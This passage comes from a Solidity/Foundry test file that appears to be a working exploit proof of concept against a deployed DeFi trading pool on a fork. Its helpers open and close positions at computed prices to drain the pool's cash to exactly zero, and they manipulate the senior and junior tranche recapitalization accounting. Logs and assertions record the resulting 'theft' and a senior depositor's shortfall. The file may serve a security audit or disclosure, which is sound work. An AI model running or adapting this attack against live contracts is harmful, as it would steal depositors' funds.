        assertLt(pool.seniorHighWaterMark(), grossMark, "gross recap mark was restored");
        console2.log("juniorReceivedAtTheft", juniorReceived);
        console2.log("seniorPrincipalDrop", seniorDrop);
    }

    /// @dev Later redeems. They settle revenue that was still queued and are not part of the theft equality.
    function _showAliceShortfall(
        uint256 aliceShares,
        uint256 seniorAfterSecond,
        uint256 bobPaid,
        uint256 supplyBefore
    ) internal {
        uint256 aliceAfter = senior.convertToAssets(senior.balanceOf(alice));
        uint256 aliceMid = aliceShares * seniorAfterSecond / senior.totalSupply();
        uint256 ownerPaid = _redeemAndCollect(junior, owner);
        uint256 alicePaid = _redeemAndCollect(senior, alice);
        _log("paid");
        console2.log("bobPaid", bobPaid);
        console2.log("ownerJuniorPaid", ownerPaid);
        console2.log("alicePaid", alicePaid);
        console2.log("aliceAssetsAfterTheft", aliceAfter);
        console2.log("aliceShareOfBookedSenior", aliceMid);
        console2.log("juniorPrincipalLeft", pool.juniorPrincipal());
        console2.log("poolCashLeft", token.balanceOf(POOL));
        console2.log("tokenSupplyIncrease", token.totalSupply() - supplyBefore);
        assertLt(alicePaid + 1_000e6, aliceMid, "alice redeemed the booked senior principal");
        assertEq(token.balanceOf(alice), alicePaid, "alice balance is not the redeem");
        assertEq(token.balanceOf(bob), bobPaid, "later redeems changed bob");
    }

    /// @dev Production deposit. Minted tokens are this account's own deposit and enter through
    ///      requestDeposit, epoch settlement, and claimDeposit.
    function _deposit(
        IVault vault,
        address account,
        uint256 amount
    ) internal {
        token.mint(account, amount);
        vm.startPrank(account);
        token.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, account, account);
        vm.stopPrank();
        console2.log("depositAccount", account);
        console2.log("depositAssets", amount);
        console2.log("depositRequest", requestId);

        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp <= maturity) vm.warp(maturity + 1);
        require(_settleEpoch(), "deposit epoch did not settle");
        uint256 claimable = vault.claimableDepositRequest(requestId, account);
        require(claimable == amount, "deposit was not fully funded");
        vm.prank(account);
        uint256 sharesMinted = vault.claimDeposit(requestId, claimable, account, account);
        console2.log("depositShares", sharesMinted);
    }

    function _mintAndRecap(
        uint256 amount
    ) internal {
        address engineOwner = engine.owner();
        token.mint(engineOwner, amount);
        vm.startPrank(engineOwner);
        token.approve(ENGINE, amount);
        engine.recapitalizePool(amount);
        vm.stopPrank();
        console2.log("recapQueued", amount);
    }

    /// @dev Open a sweeper short while the pool can still store its max profit, plus a smaller long.
    ///      Solvency uses the larger side only, so the long does not raise the buffer that stops the
    ///      fresh short drains. Those drains leave the buffer dust above the short's max profit.
    ///      The short close pays its stored max. The long then pays the dust. Its last lot is one
    ///      atom wide, so the close can land on a zero balance.
    function _drainToZero(
        uint256 entry
    ) internal {
        uint256 cap = engine.CAP_PRICE();
        uint256 profitPerLot = cap - entry;
        uint256 sweepBudget = 400 * profitPerLot;
        uint256 openedSweep = _openShrinking(sweeper, 1, 400, entry, sweepBudget);
        require(openedSweep >= 150, "sweeper open cannot cover the drain tail");
        (,,, uint256 sweepMax,,,) = engine.positions(sweeper);
        console2.log("sweeperLots", openedSweep);
        console2.log("sweeperMaxProfit", sweepMax);
        uint256 openedFinisher = _openShrinking(finisher, 0, 80, entry, 80 * entry);
        require(openedFinisher >= 20, "finisher open is below the minimum long");
        (,,, uint256 finisherMax,,,) = engine.positions(finisher);
        console2.log("finisherLots", openedFinisher);
        console2.log("finisherMaxProfit", finisherMax);

        for (uint256 pass; pass < 6; ++pass) {
            uint256 cash = token.balanceOf(POOL);
            console2.log("drainPass", pass);
            console2.log("drainCash", cash);
            if (cash == 0) return;
            if (cash <= sweepMax) break;
            (uint256 shortMax,,,) = engine.sides(1);
            uint256 budget = _maxAdditionalProfit(cash, shortMax);
            console2.log("profitBudget", budget);
            uint256 lots = _lotsUpTo(budget, entry, profitPerLot, cash);
            uint256 skewLeft = _shortLotsRoom(entry, pool.totalAssets());
            if (lots > skewLeft) lots = skewLeft;
            console2.log("drainLots", lots);
            if (lots == 0) break;
            uint256 opened = _openShrinking(drainer, 1, lots, entry, budget);
            if (opened == 0) break;
            _closeDrainerForCash(entry);
            console2.log("cashAfterDrainClose", token.balanceOf(POOL));
        }

        uint256 left = token.balanceOf(POOL);
        console2.log("cashBeforeSweeperClose", left);
        (,,, sweepMax,,,) = engine.positions(sweeper);
        (,,, finisherMax,,,) = engine.positions(finisher);
        require(left > 0, "drain emptied the pool before the sweeper close");
        require(engine.totalTraderClaimBalanceAssets() == 0, "drain left a trader claim");
        require(left <= sweepMax + finisherMax, "tail is larger than both stored max profits");
        _closeSweeperToZero(entry, sweepMax);
    }

    /// @dev Shrink the lot count when the live engine rejects the open. Each rejected attempt is
    ///      a real `processOrderTyped` that `revertToState` discards, including its margin mint.
    ///      The open this function returns is the call that was not reverted.
    function _openShrinking(
        address account,
        uint8 side,
        uint256 lots,
        uint256 entry,
        uint256 budget
    ) internal returns (uint256 opened) {
        uint256 minLots = (MIN_NOTIONAL + entry - 1) / entry;
        while (lots >= minLots) {
            uint256 margin = _marginFor(lots, entry, budget);
            uint256 snap = vm.snapshotState();
            try this.probeOpen(account, side, lots, margin, entry) {
                console2.log("openedLots", lots);
                return lots;
            } catch {
                require(vm.revertToState(snap), "open snapshot revert failed");
            }
            if (lots == minLots) return 0;
            uint256 next = lots * 4 / 5;
            if (next < minLots) next = minLots;
            lots = next;
        }
        return 0;
    }

    /// @dev External so the rejected trial can be caught. Callable only by this test.
    ///      The body is the same production open as the call that is kept.
    function probeOpen(address account, uint8 side, uint256 lots, uint256 margin, uint256 price) external {
        require(msg.sender == address(this), "probe");
        _open(account, side, lots, margin, price);
    }

    function probeClose(address account, uint8 side, uint256 exitPrice, uint256 size) external {
        require(msg.sender == address(this), "probe");
        _closeSize(account, side, exitPrice, size, false);
    }

    function _closeDrainerForCash(
        uint256 entry
    ) internal {
        uint256 liveLots = _liveLots(drainer);
        (,,, uint256 maxProfit,,,) = engine.positions(drainer);
        uint256 profitPerLot = engine.CAP_PRICE() - entry;
        uint256 payout = token.balanceOf(POOL);
        if (payout > maxProfit) payout = maxProfit;
        uint256 quantizedCap = liveLots * profitPerLot;
        if (payout > quantizedCap) payout = quantizedCap;
        payout = _quantizedPayout(liveLots, payout);
        console2.log("closeWith", payout);
        _closeAtProfit(drainer, 1, entry, payout);
    }

    /// @dev Pay the short's stored max profit, then use the long for the buffer dust the short cannot
    ///      reach. The long's last lot moves pool cash by one atom per price tick.
    function _closeSweeperToZero(
        uint256 entry,
        uint256 sweepMax
    ) internal {
        uint256 sweepLots = _liveLots(sweeper);
        uint256 payout = _quantizedPayout(sweepLots, sweepMax);
        console2.log("sweeperClosePayout", payout);
        _closeAtProfit(sweeper, 1, entry, payout);
        uint256 dust = token.balanceOf(POOL);
        console2.log("cashAfterSweeperMax", dust);
        console2.log("claimsAfterSweeperMax", engine.totalTraderClaimBalanceAssets());
        require(engine.totalTraderClaimBalanceAssets() == 0, "sweeper close created a trader claim");
        require(_liveLots(sweeper) == 0, "sweeper close left the short open");
        (,,, uint256 finisherMax,,,) = engine.positions(finisher);
        require(dust > 0 && dust <= finisherMax, "long finisher cannot cover the remaining cash");

        uint256 lots = _liveLots(finisher);
        require(lots >= 2, "finisher cannot leave a one-lot close");
        uint256 partialSize = (lots - 1) * 1e20;
        uint256 oneLotMax = entry;
        uint256 bandHigh = oneLotMax / 2;
        uint256 partialExit = _searchCashBand(finisher, 0, 1, entry - 1, partialSize, 1, bandHigh, false);
        console2.log("partialExit", partialExit);
        _closeSize(finisher, 0, partialExit, partialSize, true);
        uint256 midCash = token.balanceOf(POOL);
        console2.log("cashAfterPartial", midCash);
        console2.log("claimsAfterPartial", engine.totalTraderClaimBalanceAssets());
        require(engine.totalTraderClaimBalanceAssets() == 0, "partial close created a trader claim");
        require(_liveLots(finisher) == 1, "partial close did not leave one lot");
        require(midCash > 0 && midCash <= bandHigh, "partial close missed the one-lot band");

        uint256 finalExit = _searchExactZero(finisher, 0, 1, entry - 1, 1e20, false);
        console2.log("finalExit", finalExit);
        uint256 cashBeforeFinal = token.balanceOf(POOL);
        _closeSize(finisher, 0, finalExit, 1e20, true);
        console2.log("cashBeforeExactClose", cashBeforeFinal);
        console2.log("cashAfterExactClose", token.balanceOf(POOL));
        console2.log("claimsAfterExactClose", engine.totalTraderClaimBalanceAssets());
        require(token.balanceOf(POOL) == 0, "exact close left pool cash");
        require(engine.totalTraderClaimBalanceAssets() == 0, "exact close created a trader claim");
        require(_liveLots(finisher) == 0, "exact close left the finisher open");
        // The close that spends the last cash latches degraded mode while a position is still open.
        // Once every position is gone, assets and liability are both zero. clearDegradedMode is the
        // owner's documented recovery for that solvent state. Later settles revert until it runs.
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        console2.log("degradedOnFlatBook", engine.degradedMode());
        console2.log("longMaxOnFlatBook", longMax);
        console2.log("shortMaxOnFlatBook", shortMax);
        require(longMax == 0 && shortMax == 0, "flat book still has side liability");
        if (engine.degradedMode()) {
            vm.prank(engine.owner());
            engine.clearDegradedMode();
        }
        require(!engine.degradedMode(), "degraded mode stayed latched on a flat book");
    }

    /// @dev Binary search a close that leaves pool cash inside [low, high] and creates no claim.
    /// @param higherExtracts True when a higher exit pays the trader more. Shorts use true. Longs use false.
    function _searchCashBand(
        address account,
        uint8 side,
        uint256 lo,
        uint256 hi,
        uint256 size,
        uint256 lowCash,
        uint256 highCash,
        bool higherExtracts
    ) internal returns (uint256 exitPrice) {
        uint256 tooLittle;
        uint256 tooMuch;
        for (uint256 i; i < 80 && lo <= hi; ++i) {
            uint256 mid = (lo + hi) / 2;
            (bool ok, uint256 cashAfter, uint256 claims, uint256 sizeAfter) = _measureClose(account, side, mid, size);
            bool extractedTooMuch = !ok || claims != 0 || cashAfter < lowCash || sizeAfter == 0;
            if (extractedTooMuch) {
                tooMuch = mid;
                if (higherExtracts) {
                    if (mid == 0) break;
                    hi = mid - 1;
                } else {
                    lo = mid + 1;
                }
                continue;
            }
            if (cashAfter <= highCash) return mid;
            tooLittle = mid;
            if (higherExtracts) {
                lo = mid + 1;
            } else {
                if (mid == 0) break;
                hi = mid - 1;
            }
        }
        if (tooLittle != 0) {
            for (uint256 step = 1; step <= 512; ++step) {
                uint256 price = higherExtracts ? tooLittle + step : tooLittle - step;
                if (price == 0 || price > engine.CAP_PRICE()) break;
                (bool ok, uint256 cashAfter, uint256 claims, uint256 sizeAfter) =
                    _measureClose(account, side, price, size);
                if (ok && claims == 0 && sizeAfter != 0 && cashAfter >= lowCash && cashAfter <= highCash) {
                    return price;
                }
            }
        }
        console2.log("bandTooLittle", tooLittle);
        console2.log("bandTooMuch", tooMuch);
        revert("no close leaves cash inside the one-lot band");
    }

    /// @dev Binary search, then a short linear walk, for the exit that leaves the pool at zero.
    /// @param higherExtracts True when a higher exit pays the trader more. Shorts use true. Longs use false.
    function _searchExactZero(
        address account,
        uint8 side,
        uint256 lo,
        uint256 hi,
        uint256 size,
        bool higherExtracts
    ) internal returns (uint256 exitPrice) {
        uint256 closestPrice;
        uint256 closestCash = type(uint256).max;
        for (uint256 i; i < 90 && lo <= hi; ++i) {
            uint256 mid = (lo + hi) / 2;
            (bool ok, uint256 cashAfter, uint256 claims, uint256 sizeAfter) = _measureClose(account, side, mid, size);
            if (!ok || claims != 0) {
                if (higherExtracts) {
                    if (mid == 0) break;
                    hi = mid - 1;
                } else {
                    lo = mid + 1;
                }
                continue;
            }
            if (cashAfter == 0 && sizeAfter == 0) return mid;
            if (cashAfter < closestCash) {
                closestCash = cashAfter;
                closestPrice = mid;
            }
            if (higherExtracts) {
                lo = mid + 1;
            } else {
                if (mid == 0) break;
                hi = mid - 1;
            }
        }
        if (closestPrice != 0 && closestCash <= 4_096) {
            uint256 cap = engine.CAP_PRICE();
            for (uint256 step = 1; step <= closestCash; ++step) {
                if (!higherExtracts && closestPrice <= step) break;
                uint256 price = higherExtracts ? closestPrice + step : closestPrice - step;
                if (price > cap) break;
                (bool ok, uint256 cashAfter, uint256 claims, uint256 sizeAfter) =
                    _measureClose(account, side, price, size);
                if (ok && claims == 0 && cashAfter == 0 && sizeAfter == 0) return price;
            }
        }
        console2.log("closestCash", closestCash);
        console2.log("closestPrice", closestPrice);
        revert("no one-lot close zeros the pool");
    }

    function _measureClose(
        address account,
        uint8 side,
        uint256 exitPrice,
        uint256 size
    ) internal returns (bool ok, uint256 cashAfter, uint256 claims, uint256 sizeAfter) {
        uint256 snap = vm.snapshotState();
        try this.probeClose(account, side, exitPrice, size) {
            ok = true;
            cashAfter = token.balanceOf(POOL);
            claims = engine.totalTraderClaimBalanceAssets();
            (sizeAfter,,,,,,) = engine.positions(account);
        } catch {
            ok = false;
        }
        require(vm.revertToState(snap), "close snapshot revert failed");
    }

    /// @dev Largest extra max-profit a new position can add on top of the live directional liability
    ///      while leaving the configured settlement buffer.
    function _maxAdditionalProfit(
        uint256 cash,
        uint256 existingLiability
    ) internal view returns (uint256) {
        uint256 bps = engine.settlementBufferBps();
        if (bps == 0) {
            return cash > existingLiability ? cash - existingLiability - 1 : 0;
        }
        uint256 bufferOnExisting = existingLiability == 0 ? 0 : (existingLiability * bps + 9_999) / 10_000;
        if (cash <= existingLiability + bufferOnExisting + 1) return 0;
        return (cash - existingLiability - bufferOnExisting - 1) * 10_000 / (10_000 + bps);
    }

    /// @dev Remaining short lots under the 39% skew cap at `entry`, after the live short book.
    function _shortLotsRoom(
        uint256 entry,
        uint256 depth
    ) internal view returns (uint256) {
        if (entry == 0 || depth == 0) return 0;
        (, uint256 shortOi,,) = engine.sides(1);
        (, uint256 longOi,,) = engine.sides(0);
        uint256 shortLots = shortOi / 1e20;
        uint256 longLots = longOi / 1e20;
        uint256 capLots = depth * 39 / 100 / entry;
        uint256 used = shortLots > longLots ? shortLots - longLots : 0;
        return used >= capLots ? 0 : capLots - used;
    }

    /// @dev A long opened at `entry` and closed at the cap loses. While both principals are 0
    ///      the settlement sidecar queues that loss as revenue.
    function _queueRevenue(
        uint256 entry,
        uint256 targetLoss
    ) internal {
        uint256 cap = engine.CAP_PRICE();
        uint256 lossPerLot = cap - entry;
        uint256 lots = _lotsForProfit(targetLoss, entry, lossPerLot, token.balanceOf(POOL));
        uint256 margin = targetLoss + 50_000e6;
        _open(loser, 0, lots, margin, entry);
        _closeAtProfit(loser, 0, entry, _quantizedPayout(_liveLots(loser), targetLoss));
        console2.log("queuedRevenue", pool.pendingTradingRevenueAssets());
        require(pool.pendingTradingRevenueAssets() >= 399_999e6, "loser close did not queue enough revenue");
    }

    /// @dev Winning short. The close payout is the deployed engine payOut. Pending buckets stay.
    function _shaveCashTo(
        uint256 entry,
        uint256 targetCash
    ) internal {
        for (uint256 pass; pass < 4; ++pass) {
            uint256 cash = token.balanceOf(POOL);
            if (cash <= targetCash) return;
            uint256 need = cash - targetCash;
            uint256 cap = engine.CAP_PRICE();
            uint256 profitPerLot = cap - entry;
            uint256 lots = _lotsForProfit(need, entry, profitPerLot, cash);
            uint256 margin = _marginFor(lots, entry, need);
            _open(winner, 1, lots, margin, entry);
            uint256 cashAfterOpen = token.balanceOf(POOL);
            uint256 liveLots = _liveLots(winner);
            uint256 payout = cashAfterOpen > targetCash ? cashAfterOpen - targetCash : 0;
            uint256 maxPayout = liveLots * profitPerLot;
            if (payout > maxPayout) payout = maxPayout;
            payout = _quantizedPayout(liveLots, payout);
            require(payout > 0, "winner payout quantized to zero");
            _closeAtProfit(winner, 1, entry, payout);
            console2.log("cashAfterShave", token.balanceOf(POOL));
        }
    }

    /// @dev Largest lot count whose cap-price profit does not exceed `profitAssets` or the skew cap.
    ///      Returns zero when even the minimum position is too big for the budget.
    function _lotsUpTo(
        uint256 profitAssets,
        uint256 entry,
        uint256 profitPerLot,
        uint256 depth
    ) internal pure returns (uint256 lots) {
        if (profitPerLot == 0 || entry == 0 || profitAssets == 0) return 0;
        lots = profitAssets / profitPerLot;
        uint256 minLots = (MIN_NOTIONAL + entry - 1) / entry;
        uint256 skewLots = depth * 39 / 100 / entry;
        if (skewLots < minLots) return 0;
        if (lots > skewLots) lots = skewLots;
        if (lots < minLots) return 0;
        if (lots * profitPerLot > profitAssets) return 0;
    }

    function _lotsForProfit(
        uint256 profitAssets,
        uint256 entry,
        uint256 profitPerLot,
        uint256 depth
    ) internal pure returns (uint256 lots) {
        require(profitPerLot > 0, "no profit per lot");
        lots = (profitAssets + profitPerLot - 1) / profitPerLot;
        uint256 minLots = (MIN_NOTIONAL + entry - 1) / entry;
        if (lots < minLots) lots = minLots;
        uint256 skewLots = depth * 39 / 100 / entry;
        require(skewLots >= minLots, "depth cannot hold the minimum short");
        if (lots > skewLots) lots = skewLots;
        require(lots * profitPerLot > 0, "lots produce no profit");
    }

    function _marginFor(
        uint256 lots,
        uint256 entry,
        uint256 floor
    ) internal pure returns (uint256 margin) {
        uint256 notional = lots * entry;
        margin = notional / 2;
        if (margin < floor + 20_000e6) margin = floor + 20_000e6;
        if (margin < notional / 5) margin = notional / 5;
    }

    function _quantizedPayout(
        uint256 lots,
        uint256 payout
    ) internal pure returns (uint256) {
        if (lots == 0) return 0;
        return payout / lots * lots;
    }

    function _open(
        address account,
        uint8 side,
        uint256 lots,
        uint256 margin,
        uint256 price
    ) internal {
        token.mint(account, margin);
        vm.startPrank(account);
        token.approve(CLEARINGHOUSE, type(uint256).max);
        IClearinghouse(CLEARINGHOUSE).deposit(account, margin);
        vm.stopPrank();
        if (engine.lastMarkPrice() != price) _refreshMark(price);
        uint64 published = engine.lastMarkTime();
        // Same depth OrderRouterExecutionSidecar reads from pool.totalAssets() before processOrderTyped.
        uint256 depth = pool.totalAssets();
        console2.log("openAccount", account);
        console2.log("openSide", side);
        console2.log("openLots", lots);
        console2.log("openMargin", margin);
        // Deployed router from engine.orderRouter(). processOrderTyped is router-only on the fork.
        vm.prank(router);
        engine.processOrderTyped(
            IEngine.Order({
                account: account,
                sizeDelta: lots * 1e20,
                marginDelta: margin,
                targetPrice: price,
                commitTime: published,
                commitBlock: uint64(block.number),
                orderId: 0,
                side: side,
                isClose: false
            }),
            price,
            depth,
            published
        );
    }

    function _closeAtProfit(
        address account,
        uint8 side,
        uint256 entry,
        uint256 payout
    ) internal {
        uint256 lots = _liveLots(account);
        require(lots > 0, "nothing to close");
        require(payout % lots == 0, "payout is not a whole price step");
        uint256 exitPrice = entry + payout / lots;
        require(exitPrice > entry, "exit does not profit a short or lose a long");
        _closeSize(account, side, exitPrice, lots * 1e20, true);
        require(_liveLots(account) == 0, "close left a position");
    }

    function _closeSize(
        address account,
        uint8 side,
        uint256 exitPrice,
        uint256 size,
        bool verbose
    ) internal {
        require(size > 0 && size % 1e20 == 0, "close size");
        require(exitPrice <= engine.CAP_PRICE(), "exit above the cap");
        _refreshMark(exitPrice);
        uint64 published = engine.lastMarkTime();
        // Same depth OrderRouterExecutionSidecar reads from pool.totalAssets() before processOrderTyped.
        uint256 depth = pool.totalAssets();
        uint256 cashBefore = token.balanceOf(POOL);
        uint256 walletBefore = token.balanceOf(account);
        // Deployed router from engine.orderRouter(). processOrderTyped is router-only on the fork.
        vm.prank(router);
        engine.processOrderTyped(
            IEngine.Order({
                account: account,
                sizeDelta: size,
                marginDelta: 0,
                targetPrice: exitPrice,
                commitTime: published,
                commitBlock: uint64(block.number),
                orderId: 0,
                side: side,
                isClose: true
            }),
            exitPrice,
            depth,
            published
        );
        if (verbose) {
            uint256 cashAfter = token.balanceOf(POOL);
            console2.log("closeExit", exitPrice);
            console2.log("closeSize", size);
            console2.log("closeCashBefore", cashBefore);
            console2.log("closeCashAfter", cashAfter);
            console2.log("closeWalletDelta", token.balanceOf(account) - walletBefore);
        }
    }

    function _liveLots(
        address account
    ) internal view returns (uint256 lots) {
        (uint256 size,,,,,,) = engine.positions(account);
        lots = size / 1e20;
    }

    function _lowEntry() internal view returns (uint256 entry) {
        uint256 cap = engine.CAP_PRICE();
        entry = cap / 4;
        require(entry > 0 && entry < cap, "cap cannot price a short");
    }

    function _redeemAndCollect(
        IVault vault,
        address account
    ) internal returns (uint256 assetsOut) {
        uint256 unlock = vault.lastDepositTime(account) + vault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) vm.warp(unlock);
        _refreshMark(engine.lastMarkPrice());
        uint256 shares = vault.maxRequestRedeem(account);
        console2.log("redeemAccount", account);
        console2.log("redeemShares", shares);
        if (shares == 0) return 0;

        vm.prank(account);
        uint256 requestId = vault.requestRedeem(shares, account, account);
        uint256 beforeBal = token.balanceOf(account);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp <= maturity) vm.warp(maturity + 1);
        require(_settleEpoch(), "redeem epoch did not settle");
        uint256 refundShares = vault.refundableRedeemRequest(requestId, account);
        if (refundShares != 0) {
            vm.prank(account);
            vault.claimRedeemRefund(requestId, account, account);
            console2.log("refundedShares", refundShares);
            return 0;
        }
        uint256 claimable = vault.claimableRedeemRequest(requestId, account);
        console2.log("claimableShares", claimable);
        if (claimable != 0) {
            vm.prank(account);
            vault.claimRedeem(requestId, claimable, account, account);
        }
        assetsOut = token.balanceOf(account) - beforeBal;
        console2.log("redeemedAssets", assetsOut);
    }

    function _settleEpoch() internal returns (bool progressed) {
        _refreshMark(engine.lastMarkPrice());
        uint256 mark = engine.lastMarkPrice();
        uint64 published = engine.lastMarkTime();
        vm.prank(router);
        try pool.settleLpEpoch(mark, published) {
            return true;
        } catch (bytes memory reason) {
            if (reason.length < 4 || bytes4(reason) != IPool.HousePool__NoLpEpochProgress.selector) {
                assembly {
                    revert(add(reason, 32), mload(reason))
                }
            }
            return false;
        }
    }

    function _warpUntilOracleLive() internal {
        vm.warp(LIVE_TS);
        require(!engine.isOracleFrozen(), "engine frozen at the Sunday open");
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        // Deployed router from engine.orderRouter(). updateMarkPrice is router-only on the fork.
        vm.prank(router);
        engine.updateMarkPrice(price, uint64(block.timestamp));
    }

    function _log(
        string memory tag
    ) internal view {
        console2.log(tag);
        console2.log("  cash", token.balanceOf(POOL));
        console2.log("  accounted", pool.totalAssets());
        console2.log("  seniorP", pool.seniorPrincipal());
        console2.log("  juniorP", pool.juniorPrincipal());
        console2.log("  hwm", pool.seniorHighWaterMark());
        console2.log("  pendRecap", pool.pendingRecapitalizationAssets());
        console2.log("  pendRev", pool.pendingTradingRevenueAssets());
        console2.log("  claims", engine.totalTraderClaimBalanceAssets());
        console2.log("  aliceAssets", senior.convertToAssets(senior.balanceOf(alice)));
        console2.log("  bobAssets", junior.convertToAssets(junior.balanceOf(bob)));
        console2.log("  aliceUsdg", token.balanceOf(alice));
        console2.log("  bobUsdg", token.balanceOf(bob));
    }

}

interface IUsdG {

    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);

}

interface IPool {

    error HousePool__NoLpEpochProgress();

    function owner() external view returns (address);
    function juniorPrincipal() external view returns (uint256);
    function seniorPrincipal() external view returns (uint256);
    function seniorHighWaterMark() external view returns (uint256);
    function pendingRecapitalizationAssets() external view returns (uint256);
    function pendingTradingRevenueAssets() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function settleLpEpoch(uint256 expectedMarkPrice, uint256 expectedPublishTime) external;
    function lpEpochStart(uint256 epochId) external pure returns (uint256);

}

interface IVault {

    function requestDeposit(uint256 assets, address controller, address owner) external returns (uint256 requestId);
    function claimableDepositRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimDeposit(uint256 requestId, uint256 assets, address receiver, address controller)
        external
        returns (uint256 shares);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function lastDepositTime(address account) external view returns (uint256);
    function DEPOSIT_COOLDOWN() external view returns (uint256);
    function maxRequestRedeem(address account) external view returns (uint256);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function claimableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function refundableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function claimRedeem(uint256 requestId, uint256 shares, address receiver, address controller)
        external
        returns (uint256 assets);
    function claimRedeemRefund(uint256 requestId, address receiver, address controller) external returns (uint256 shares);

}

interface IEngine {

    struct Order {
        address account;
        uint256 sizeDelta;
        uint256 marginDelta;
        uint256 targetPrice;
        uint64 commitTime;
        uint64 commitBlock;
        uint64 orderId;
        uint8 side;
        bool isClose;
    }

    function owner() external view returns (address);
    function orderRouter() external view returns (address);
    function degradedMode() external view returns (bool);
    function clearDegradedMode() external;
    function CAP_PRICE() external view returns (uint256);
    function settlementBufferBps() external view returns (uint256);
    function lastMarkPrice() external view returns (uint256);
    function lastMarkTime() external view returns (uint64);
    function isOracleFrozen() external view returns (bool);
    function totalTraderClaimBalanceAssets() external view returns (uint256);
    function recapitalizePool(uint256 amountAssets) external;
    function updateMarkPrice(uint256 price, uint64 publishTime) external;
    function processOrderTyped(Order calldata order, uint256 currentOraclePrice, uint256 poolDepthAssets, uint64 publishTime)
        external;
    function sides(uint256 side)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
    function positions(address account)
        external
        view
        returns (
            uint256 size,
            uint256 margin,
            uint256 entryPrice,
            uint256 maxProfitAssets,
            uint8 side,
            uint64 lastUpdateTime,
            int256 vpiAccrued
        );

}

interface IClearinghouse {

    function deposit(address account, uint256 amount) external;

}
```
